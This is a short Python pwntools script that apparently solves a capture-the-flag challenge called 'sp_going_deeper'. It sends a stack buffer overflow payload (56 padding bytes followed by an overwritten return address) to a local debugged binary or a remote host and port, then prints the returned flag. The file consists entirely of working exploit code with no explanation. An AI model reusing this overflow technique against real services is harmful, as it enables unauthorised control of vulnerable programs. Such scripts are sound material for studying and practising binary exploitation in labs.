#!/usr/bin/env python3

from pwn import *
import sys

def exploit(io):
    payload = b"A"*56 + p64(0x400b12)
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b"Input: ", payload)
    io.recvuntil(b"..\n\n")    
    flag = io.recvline().decode()
    print(flag)

def main():
    if sys.argv[1] == "debug":
        io = gdb.debug("./sp_going_deeper")
    else:
        HOST, PORT = sys.argv[1].split(":")
        io = remote(HOST, PORT)

    exploit(io)


if __name__ == "__main__":
    main()
